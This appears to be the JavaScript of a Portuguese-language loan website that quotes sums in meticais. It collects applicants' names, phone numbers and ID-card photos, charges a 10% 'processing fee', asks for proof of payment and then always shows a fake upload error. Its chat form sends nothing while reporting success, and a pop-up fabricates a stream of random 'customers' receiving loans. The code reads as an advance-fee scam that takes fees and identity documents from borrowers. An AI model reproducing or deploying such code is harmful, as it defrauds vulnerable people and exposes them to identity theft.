let valorPedidoGlobal = 0;
let processFeeGlobal = 0;
let valorTotalGlobal = 0;

function showPage(id) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

function goToPage1() { showPage('page1'); }

function goToPage2() {
    const nome = document.getElementById('nome');
    const tel = document.getElementById('telefone');
    const prov = document.getElementById('provincia');
    const biF = document.getElementById('bi-frente');
    const biV = document.getElementById('bi-verso');

    let valido = true;

    [nome, tel, prov, biF, biV].forEach(campo => {
        campo.style.border = '1px solid #ccc';
        if (!campo.value || (campo.type === 'file' && campo.files.length === 0)) {
            campo.style.border = '2px solid #e63946';
            valido = false;
        }
    });

    if (!valido) {
        alert('⚠️ Preencha todos os campos obrigatórios.');
        return;
    }

    showPage('page2');
}

function goToPage3() {
    document.getElementById('feeDisplay').textContent = processFeeGlobal + ' MT';
    showPage('page3');
}

function simular() {
    const valor = parseFloat(document.getElementById('valor').value);

    if (valor < 2000 || valor > 250000) {
        alert("Valor inválido");
        return;
    }

    const taxaEmprestimo = valor * 0.30;
    const total = valor + taxaEmprestimo;
    const taxaProcessamento = valor * 0.10;

    valorPedidoGlobal = valor;
    valorTotalGlobal = total;
    processFeeGlobal = taxaProcessamento;

    document.getElementById('valorSolicitado').textContent = valor;
    document.getElementById('custoEmprestimo').textContent = taxaEmprestimo;
    document.getElementById('valorTotal').textContent = total;

    const opcoes = document.getElementById('opcoesPrazo');
    opcoes.innerHTML = '';

    const planos = [
        { semanas: 2, texto: "2 Semanas", parcelas: 1 },
        { semanas: 4, texto: "1 Mês", parcelas: 4 },
        { semanas: 8, texto: "2 Meses", parcelas: 8 },
        { semanas: 12, texto: "3 Meses", parcelas: 12 },
    ];

    planos.forEach(p => {
        const parcela = (total / p.parcelas).toFixed(2);
        opcoes.innerHTML += `
            <div class="card">
                <strong>${p.texto}</strong><br>
                ${p.parcelas} pagamentos de <b>${parcela} MT</b>
                <button class="btn" onclick="goToPage3()">Escolher</button>
            </div>
        `;
    });

    document.getElementById('resultado').classList.remove('hidden');
}

function finalizarPedido() {
    const input = document.getElementById('comprovativo');
    input.style.border = "1px solid #ccc";

    if (!input.files || input.files.length === 0) {
        input.style.border = "2px solid #e63946";
        alert("⚠️ Carregue o comprovativo antes de finalizar.");
        return;
    }

    alert("⚠️ Erro ao carregar o comprovativo! Tenta de novo.");
}

// Chatbot JS
function openChatModal() {
    document.getElementById('chatModal').style.display = 'block';
}
function closeChatModal() {
    document.getElementById('chatModal').style.display = 'none';
}
function sendChatMessage() {
    const n=document.getElementById('chat-nome').value;
    const t=document.getElementById('chat-telefone').value;
    const m=document.getElementById('chat-msg').value;
    if(!n||!t||!m){alert('Preencha todos os campos.');return;}
    alert('Mensagem enviada com sucesso!');
    closeChatModal();
}

// --- Pop-up Prova Social ---
function socialPopup() {
    const popup = document.getElementById('social-proof-popup');
    if (!popup) return;

    const prefixos=[84,85,86,87,82,83];
    const numero = prefixos[Math.floor(Math.random()*prefixos.length)] + ' xxxx ' + Math.floor(100+Math.random()*900);
    const valor = Math.floor(2000 + Math.random()*250000);

    popup.innerHTML = `✅ ${numero} recebeu ${valor} MT`;
    popup.classList.add('show');

    setTimeout(()=>popup.classList.remove('show'),3000);
}

// inicia automaticamente depois do load
document.addEventListener('DOMContentLoaded', () => {
    setInterval(socialPopup, 4000);
});
